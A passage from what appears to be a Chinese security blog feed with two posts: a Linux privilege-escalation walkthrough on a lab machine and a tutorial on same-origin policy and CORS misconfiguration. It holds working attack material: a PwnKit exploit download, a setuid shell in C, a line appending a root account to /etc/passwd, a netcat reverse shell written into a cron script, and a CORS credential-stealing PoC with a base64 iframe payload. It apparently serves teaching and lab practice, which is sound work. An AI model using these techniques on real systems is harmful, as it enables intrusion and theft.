class="language-none">wget http:&#x2F;&#x2F;192.168.235.1&#x2F;CVE-2021-4034-main.zipunzip CVE-2021-4034-main.zip &amp;&amp; cd CVE-2021-4034-main &amp;&amp; make &amp;&amp; .&#x2F;cve-2021-4034whoami##  root  提权成功</code></pre><p><img src="/%5Cimages%5Cposts%5CLinux%E6%8F%90%E6%9D%83(escalate_linux_1%E9%9D%B6%E6%9C%BA)%5C1726376543136.jpg"></p><h2 id="环境变量提权"><a href="#环境变量提权" class="headerlink" title="环境变量提权"></a>环境变量提权</h2><p>suid提权时还有一个自定义设置的&#x2F;home&#x2F;user5&#x2F;script</p><p>执行结果</p><pre class="language-bash" data-language="bash"><code class="language-bash">./scriptDesktopDocumentsDownloadsMusiPicturesPublicTemplatesVideos<span class="token function">ls</span>script</code></pre><p>像是root下的ls命令</p><pre class="language-none"><code class="language-none">cp &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;ls  复制bash命令到&#x2F;tmp目录下的lsexport PATH&#x3D;&#x2F;tmp:$PATH   把&#x2F;tmp目录添加为环境变量echo $PATH   查看环境变量</code></pre><p>此时执行ls就是执行&#x2F;tmp目录下的ls&#x3D;&gt;bash命令</p><pre class="language-bash" data-language="bash"><code class="language-bash">/home/user5/script<span class="token function">whoami</span><span class="token comment">## root  成功提权</span></code></pre><p><img src="/%5Cimages%5Cposts%5CLinux%E6%8F%90%E6%9D%83(escalate_linux_1%E9%9D%B6%E6%9C%BA)%5C1726382340059.jpg"></p><h2 id="NFS提权"><a href="#NFS提权" class="headerlink" title="NFS提权"></a>NFS提权</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /etc/exports<span class="token comment">## /home/user5 *(rw,no_root_squash)</span></code></pre><p>没有限制<code>root</code>权限用户的远程访问</p><pre class="language-bash" data-language="bash"><code class="language-bash">攻击机：showmount <span class="token parameter variable">-e</span> <span class="token number">192.168</span>.235.129<span class="token comment">## Export list for 192.168.235.129:</span><span class="token comment">## /home/user5 *</span></code></pre><p>创建文件夹挂载目录</p><pre class="language-none"><code class="language-none">mkdir &#x2F;tmp&#x2F;testmount -o rw 192.168.235.129:&#x2F;home&#x2F;user5 &#x2F;tmp&#x2F;test</code></pre><p>&#x2F;tmp&#x2F;test下创建shell.c</p><pre class="language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;sys&#x2F;types.h&gt; #include &lt;unistd.h&gt; int main() &#123; setuid(0); system(&quot;&#x2F;bin&#x2F;bash&quot;); return 0; &#125;</code></pre><p>编译后赋予权限</p><pre class="language-none"><code class="language-none">gcc shell.c -o shellchmod +s shell</code></pre><p>回到目标机</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /home/user5./shell  成功提权</code></pre><p><img src="/%5Cimages%5Cposts%5CLinux%E6%8F%90%E6%9D%83(escalate_linux_1%E9%9D%B6%E6%9C%BA)%5C1726395441195.jpg"></p><h2 id="Mysql数据泄露"><a href="#Mysql数据泄露" class="headerlink" title="Mysql数据泄露"></a>Mysql数据泄露</h2><p>Mysql密码为弱口令<code>root</code>，登录后在<code>user</code>库，<code>user_info</code>表下泄露了mysql用户的密码</p><pre class="language-bash" data-language="bash"><code class="language-bash">python <span class="token parameter variable">-c</span> <span class="token string">'import pty;pty.spawn("/bin/bash")'</span> 启动一个更完整的shell环境才能使用Mysqlmysql <span class="token parameter variable">-u</span> root <span class="token parameter variable">-p</span></code></pre><p><img src="/%5Cimages%5Cposts%5CLinux%E6%8F%90%E6%9D%83(escalate_linux_1%E9%9D%B6%E6%9C%BA)%5C1726398067090.jpg"></p><p>在&#x2F;var下的mysql之前没有权限查看，现在用mysql用户查看</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /var/mysql<span class="token function">chmod</span> +x .user_informations<span class="token function">cat</span> .user_informations<span class="token comment">## user2:user2@12345</span><span class="token comment">## user3:user3@12345</span><span class="token comment">## user4:user4@12345</span><span class="token comment">## user5:user5@12345</span><span class="token comment">## user6:user6@12345</span><span class="token comment">## user7:user7@12345</span><span class="token comment">## user8:user8@12345</span></code></pre><p>其余用户的密码都泄露出来</p><pre class="language-none"><code class="language-none">find &#x2F; -user mysql 查看当前用户所属的文件root密码在 &#x2F;etc&#x2F;mysql&#x2F;secret.cnf里面，弱口令12345</code></pre><p><img src="/%5Cimages%5Cposts%5CLinux%E6%8F%90%E6%9D%83(escalate_linux_1%E9%9D%B6%E6%9C%BA)%5C1726398766520.jpg"></p><h2 id="SUDO-CVE-2021-3156-提权-失败"><a href="#SUDO-CVE-2021-3156-提权-失败" class="headerlink" title="SUDO(CVE-2021-3156)提权(失败)"></a>SUDO(CVE-2021-3156)提权(失败)</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token parameter variable">--version</span>版本在<span class="token number">1.8</span>.2-1.8.31p2<span class="token number">1.9</span>.0-1.9.5p1之间sudoedit <span class="token parameter variable">-s</span> /</code></pre><p><img src="/%5Cimages%5Cposts%5CLinux%E6%8F%90%E6%9D%83(escalate_linux_1%E9%9D%B6%E6%9C%BA)%5C1726400810453.jpg"></p><p><a href="https://github.com/blasty/CVE-2021-3156">EXP</a></p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> CVE-2021-3156<span class="token function">make</span><span class="token function">chmod</span> +x ./sudo-hax-me-a-sandwich./sudo-hax-me-a-sandwich<span class="token function">uname</span> <span class="token parameter variable">-a</span> 查看内核./sudo-hax-me-a-sandwich <span class="token number">1</span></code></pre><p>提不成功</p><h2 id="SUDO滥用提权"><a href="#SUDO滥用提权" class="headerlink" title="SUDO滥用提权"></a>SUDO滥用提权</h2><p><code>user8</code>和<code>user2</code>用户</p><blockquote><p>user8用户</p></blockquote><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">su</span> user8<span class="token function">sudo</span> <span class="token parameter variable">-l</span></code></pre><p>vi命令可以不要密码直接以root权限进行操作</p><p><img src="/%5Cimages%5Cposts%5CLinux%E6%8F%90%E6%9D%83(escalate_linux_1%E9%9D%B6%E6%9C%BA)%5C1726400980627.jpg"></p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">vi</span> aaavi里面写入<span class="token operator">!</span>:sh运行这个命令后会进入一个 shell 环境，可以执行命令</code></pre><p><img src="/%5Cimages%5Cposts%5CLinux%E6%8F%90%E6%9D%83(escalate_linux_1%E9%9D%B6%E6%9C%BA)%5C1726401586660.jpg"></p><blockquote><p>user2用户</p></blockquote><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">su</span> user2</code></pre><p> <code>user2</code> 可以以 <code>user1</code> 的身份执行 所有 命令</p><p><img src="/%5Cimages%5Cposts%5CLinux%E6%8F%90%E6%9D%83(escalate_linux_1%E9%9D%B6%E6%9C%BA)%5C1726402120044.jpg"></p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token parameter variable">-u</span> user1 /bin/bash</code></pre><p>然后<code>user1</code>又可以以<code>root</code>用户的身份执行所有命令</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">su</span></code></pre><p><img src="/%5Cimages%5Cposts%5CLinux%E6%8F%90%E6%9D%83(escalate_linux_1%E9%9D%B6%E6%9C%BA)%5C1726402341853.jpg"></p><p><code>user1</code>用户的密码也跟其他一个格式<code>user1@12345</code></p><h2 id="文件权限问题导致提权"><a href="#文件权限问题导致提权" class="headerlink" title="文件权限问题导致提权"></a>文件权限问题导致提权</h2><p><code>user4</code>用户属于<code>root</code>组，而&#x2F;etc&#x2F;passwd同组可写</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> <span class="token parameter variable">-l</span> /etc/passwd<span class="token builtin class-name">echo</span> <span class="token string">"jiqimer:<span class="token variable"><span class="token variable">$(</span>openssl <span class="token function">passwd</span> <span class="token parameter variable">-1</span> <span class="token parameter variable">-salt</span> admin <span class="token number">123456</span><span class="token variable">)</span></span>:0:0:root:/root:/bin/bash"</span> <span class="token operator">>></span> /etc/passwd   <span class="token function">su</span> admin</code></pre><p><img src="/%5Cimages%5Cposts%5CLinux%E6%8F%90%E6%9D%83(escalate_linux_1%E9%9D%B6%E6%9C%BA)%5C1726404009665.jpg"></p><h2 id="定时任务权限配置不当"><a href="#定时任务权限配置不当" class="headerlink" title="定时任务权限配置不当"></a>定时任务权限配置不当</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /etc/crontab</code></pre><p>&#x2F;home&#x2F;user4&#x2F;Desktop下的autoscript.sh有root权限</p><p><img src="/%5Cimages%5Cposts%5CLinux%E6%8F%90%E6%9D%83(escalate_linux_1%E9%9D%B6%E6%9C%BA)%5C1726404138727.jpg"></p><p>切换到<code>user4</code>,修改里面的内容</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">su</span> user4<span class="token builtin class-name">cd</span> /home/user4/Desktop<span class="token builtin class-name">echo</span> <span class="token string">"rm f;mkfifo f;cat f|/bin/sh -i 2>&amp;1|nc 192.168.235.1 8080 > f"</span> <span class="token operator">></span> autoscript.sh</code></pre><p><img src="/%5Cimages%5Cposts%5CLinux%E6%8F%90%E6%9D%83(escalate_linux_1%E9%9D%B6%E6%9C%BA)%5C1726404826034.jpg"></p><p>五分钟后就会弹shell过来</p><p><img src="/%5Cimages%5Cposts%5CLinux%E6%8F%90%E6%9D%83(escalate_linux_1%E9%9D%B6%E6%9C%BA)%5C1726405046885.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端跨域漏洞</title>
      <link href="/2024/11/11/%E5%89%8D%E7%AB%AF%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E/"/>
      <url>/2024/11/11/%E5%89%8D%E7%AB%AF%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><p>如果两个 URL 的协议、端口（如果有指定的话）和主机都相同的话，则这两个 URL 是<em>同源</em>的。这个方案也被称为“协议&#x2F;主机&#x2F;端口元组”，或者直接是“元组”。（“元组”是指一组项目构成的整体，具有双重&#x2F;三重&#x2F;四重&#x2F;五重等通用形式。）</p><p>与 URL <code>http://store.company.com/dir/page.html</code> 的源进行对比的示例：</p><table><thead><tr><th align="left">URL</th><th align="left">结果</th><th align="left">原因</th></tr></thead><tbody><tr><td align="left"><code>http://store.company.com/dir2/other.html</code></td><td align="left">同源</td><td align="left">只有路径不同</td></tr><tr><td align="left"><code>http://store.company.com/dir/inner/another.html</code></td><td align="left">同源</td><td align="left">只有路径不同</td></tr><tr><td align="left"><code>https://store.company.com/secure.html</code></td><td align="left">失败</td><td align="left">协议不同</td></tr><tr><td align="left"><code>http://store.company.com:81/dir/etc.html</code></td><td align="left">失败</td><td align="left">端口不同（<code>http://</code> 默认端口是 80）</td></tr><tr><td align="left"><code>http://news.company.com/dir/other.html</code></td><td align="left">失败</td><td align="left">主机不同</td></tr></tbody></table><p><strong>源的更改</strong></p><p>脚本可以将 <code>document.domain</code> 的值设置为其当前域或其当前域的父域。如果将其设置为其当前域的父域，则这个较短的父域将用于后续源检查。</p><p><code>http://store.company.com/dir/other.html</code> 文档中的一个脚本执行以下语句：</p><pre class="language-none"><code class="language-none">document.domain &#x3D; &quot;company.com&quot;;</code></pre><p>这条语句执行之后，页面将会成功地通过与 <code>http://company.com/dir/page.html</code> 的同源检测</p><p><strong>cookie的同源策略</strong></p><p>cookie使用不同的源定义方式，一个页面可以为本域和任何父域设置cookie，只要是父域不是公共后缀(public suffix)即可。</p><p>不管使用哪个协议(HTTP&#x2F;HTTPS)或端口号，浏览器都允许给定的域以及其任何子域名访问cookie。设置 cookie时，可以使用 <code>domain</code> &#x2F; <code>path</code> &#x2F; <code>secure</code> 和 <code>http-only</code> 标记来限定其访问性。</p><p>所以 <code>https://localhost:8080/</code> 和 <code>http://localhost:8081/</code> 的Cookie是共享的。</p><p> <strong>跨源脚本API访问</strong></p><p>Javascript的APIs中，如 <code>iframe.contentWindow</code> , <code>window.parent</code>, <code>window.open</code> 和 <code>window.opener</code> 允许文档间相互引用。当两个文档的源不同时，这些引用方式将对 <code>window</code> 和 <code>location</code> 对象的访问添加限制。</p><p><code>window</code> 允许跨源访问的方法有</p><ul><li>window.blur</li><li>window.close</li><li>window.focus</li><li>window.postMessage</li></ul><p><code>window</code> 允许跨源访问的属性有</p><ul><li>window.closed</li><li>window.frames</li><li>window.length</li><li>window.location</li><li>window.opener</li><li>window.parent</li><li>window.self</li><li>window.top</li><li>window.window</li></ul><p>其中 <code>window.location</code> 允许读&#x2F;写，其他的属性只允许读</p><p><strong>常见请求头</strong></p><ul><li><ul><li><p>Origin</p><p>预检请求或实际请求的源站URI, 浏览器请求默认会发送该字段<code>Origin: &lt;origin&gt;</code></p></li></ul></li><li><ul><li><p>Access-Control-Request-Method</p><p>声明请求使用的方法<code>Access-Control-Request-Method: &lt;method&gt;</code></p></li></ul></li><li><ul><li><p>Access-Control-Request-Headers</p><p>声明请求使用的header字段<code>Access-Control-Request-Headers: &lt;field-name&gt;[, &lt;field-name&gt;]*</code></p></li></ul></li></ul><p><strong>常见返回头</strong></p><ul><li><ul><li><p>Access-Control-Allow-Origin</p><p>声明允许访问的源外域URI对于携带身份凭证的请求不可使用通配符 <code>*``Access-Control-Allow-Origin: &lt;origin&gt; | *</code></p></li></ul></li><li><ul><li><p>Access-Control-Expose-Headers</p><p>声明允许暴露的头e.g. <code>Access-Control-Expose-Headers: X-My-Custom-Header, X-Another-Custom-Header</code></p></li></ul></li><li><ul><li><p>Access-Control-Max-Age</p><p>声明Cache时间<code>Access-Control-Max-Age: &lt;delta-seconds&gt;</code></p></li></ul></li><li><ul><li><p>Access-Control-Allow-Credentials</p><p>声明是否允许在请求中带入<code>Access-Control-Allow-Credentials: true</code></p></li></ul></li><li><ul><li><p>Access-Control-Allow-Methods</p><p>声明允许的访问方式<code>Access-Control-Allow-Methods: &lt;method&gt;[, &lt;method&gt;]*</code></p></li></ul></li><li><ul><li><p>Access-Control-Allow-Headers</p><p>声明允许的头<code>Access-Control-Allow-Headers: &lt;field-name&gt;[, &lt;field-name&gt;]*</code></p></li></ul></li></ul><p><a href="https://websec.readthedocs.io/zh/latest/vuln/xss/sop.html">https://websec.readthedocs.io/zh/latest/vuln/xss/sop.html</a></p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy">https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy</a></p><h2 id="CORS漏洞"><a href="#CORS漏洞" class="headerlink" title="CORS漏洞"></a>CORS漏洞</h2><h3 id="什么是CORS"><a href="#什么是CORS" class="headerlink" title="什么是CORS"></a>什么是CORS</h3><p>COTS全称”跨域资源共享”（Cross-origin resource sharing），是一种基于 HTTP 头的机制，这个机制通过允许服务器标示除了它自己以外的其它源（域、协议或端口），使得浏览器允许这些源访问加载自己的资源。他的出现就是为了弥补SOP（同源策略）的不足，因为有些业务的原因，需要绕过SOP（同源策略）来实现跨域资源共享。</p><p>而CORS漏洞则是配置不当，Access-Control-Allow-Origin字段代表允许哪个域访问加载自己的资源，如果当字段值为’*’，就代表任意域都可以访问，这时候就造成了CORS漏洞了。</p><h3 id="CORS-相关-headers"><a href="#CORS-相关-headers" class="headerlink" title="CORS 相关 headers"></a>CORS 相关 headers</h3><ul><li><p><code>Origin</code>: 指请求发起方域</p></li><li><p><code>Access-Control-Request-Headers</code>：用于预检请求，告知服务器实际请求会有哪些自定义头部字段</p></li><li><p><code>Access-Control-Request-Method</code>：用于预检请求，告知服务器实际请求会使用哪一种方法</p></li><li><p><code>Access-Control-Allow-Origin</code>：指请求资源允许跟哪些域共享</p></li><li><p><code>Access-Control-Allow-Credentials</code>：指是否允许浏览器发送包含凭据的请求</p></li><li><p><code>Access-Control-Allow-Headers</code>：指实际请求允许使用的自定义请求头</p></li><li><p><code>Access-Control-Allow-Methods</code>：指实际请求允许使用的请求方法</p></li><li><p><code>Access-Control-Expose-Headers</code>：指允许 js 获取的响应头部中的字段</p></li><li><p><code>Access-Control-Max-Age</code>：指预检请求的结果在多少秒内有效</p></li></ul><p>SameStie：</p><ul><li>Strict表示该Cookie仅用作第一方Cookie。并且当用户从A网站移动到B网站时，首次访问中不发送标为Strict的B网站Cookie。这对安全性需求较高的网站比较适用。如果你的B网站登录状态为“登录中”，那么A网站点到B网站时，登录状态为“未登录”。用户需要再点一次登录。这对一些“更改密码”或者“进行结账”的访问比较合适。</li><li>Lax与Strict大致相当，表示该Cookie仅用作第一方Cookie。但去掉了首次从其他网站来的推荐访问不发送Cookie的限制。</li><li>None则表示该Cookie可被跨域发送。当前版本的Chrome浏览器中，如果Cookie没有声明SameSite的值，则默认为None。</li></ul><h3 id="CORS漏洞挖掘："><a href="#CORS漏洞挖掘：" class="headerlink" title="CORS漏洞挖掘："></a>CORS漏洞挖掘：</h3><p><strong>利用条件</strong></p><p>Cookie 的 SameSite 属性用来限制第三方 Cookie，从而减少安全风险。如果是老版本的谷歌SameStie是默认为None的，但在Chrome 80中默认值将为Lax。所以SameStie还要设置为None才行</p><p><img src="/%5Cimages%5Cposts%5C%E5%89%8D%E7%AB%AF%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E%5Cimage-20241110165424929.png"></p><p>请求头添加：Origin: <a href="https://example.com/">https://example.com</a></p><p>条件2：</p><p>如果返回头是以下，那么可直接利用</p><ul><li>Access-Control-Allow-Origin: <a href="https://example.com/">https://example.com</a></li><li>Access-Control-Allow-Credentials: true</li></ul><p>利用麻烦</p><ul><li>Access-Control-Allow-Origin: null</li><li>Access-Control-Allow-Credentials: true</li></ul><p>不存在情况,Null要小写才存在</p><ul><li>Access-Control-Allow-Origin: Null</li><li>Access-Control-Allow-Credentials: true</li></ul><p>以下不存在，可写低危CORS配置错误</p><ul><li>Access-Control-Allow-Origin:  *</li><li>Access-Control-Allow-Credentials: true</li></ul><p>或者</p><ul><li>Access-Control-Allow-Origin:  *</li></ul><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p><strong>POC</strong></p><p>attack.html</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>demo<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">cors</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>Exploit<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">    <span class="token keyword">function</span> <span class="token function">cors</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> xhttp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        xhttp<span class="token punctuation">.</span><span class="token function-variable function">onreadystatechange</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>xhttp<span class="token punctuation">.</span>readyState <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                <span class="token function">alert</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>responseText<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>                    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        xhttp<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span><span class="token string">"http://127.0.0.1/admin/sensitive.php"</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span>        xhttp<span class="token punctuation">.</span>withCredentials <span class="token operator">=</span> <span class="token boolean">true</span>        xhttp<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>login.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'OPTIONS'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 对预检请求返回 200 状态码并退出</span>    <span class="token function">http_response_code</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">exit</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 处理实际的 GET 请求</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'GET'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token constant">null</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$user</span> <span class="token operator">!==</span> <span class="token constant">null</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$user</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'/admin; SameSite=None; Secure'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"登录成功"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"状态：未登录"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>sensitive.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Access-Control-Allow-Origin: "</span> <span class="token operator">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_ORIGIN'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Access-Control-Allow-Credentials: true"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Type: application/json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'OPTIONS'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">http_response_code</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">exit</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 处理实际的 GET 请求</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'GET'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"交易密码是 123"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"未获取到交易密码"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>如果是第二种<code>header(&quot;Access-Control-Allow-Origin: &quot; . &quot;null&quot;);</code>的情况</p><p>用iframe标签</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>iframe sandbox<span class="token operator">=</span><span class="token string">"allow-scripts"</span> src<span class="token operator">=</span><span class="token string">"data:text/html;base64,PHNjcmlwdD4KICAgIHZhciB4aHIgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTsKICAgIHhoci5vcGVuKCdHRVQnLCAnaHR0cDovLzEyNy4wLjAuMS9hZG1pbi9zZW5zaXRpdmUucGhwJywgdHJ1ZSk7CiAgICB4aHIud2l0aENyZWRlbnRpYWxzID0gdHJ1ZTsKICAgIHhoci5vbnJlYWR5c3RhdGVjaGFuZ2UgPSBmdW5jdGlvbiAoKSB7CiAgICAgICAgaWYgKHhoci5zdGF0dXMgPT09IDIwMCkgewogICAgICAgICAgICBjb25zb2xlLmxvZyh4aHIucmVzcG9uc2VUZXh0KTsKICAgICAgICB9CiAgICB9OwogICAgeGhyLnNlbmQoKTsKPC9zY3JpcHQ+"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>iframe<span class="token operator">></span></code></pre><p>base64编码内容是</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>    <span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'http://127.0.0.1/admin/sensitive.php'</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    xhr<span class="token punctuation">.</span>withCredentials <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    xhr<span class="token punctuation">.</span><span class="token function-variable function">onreadystatechange</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>status <span class="token operator">===</span> <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>responseText<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token 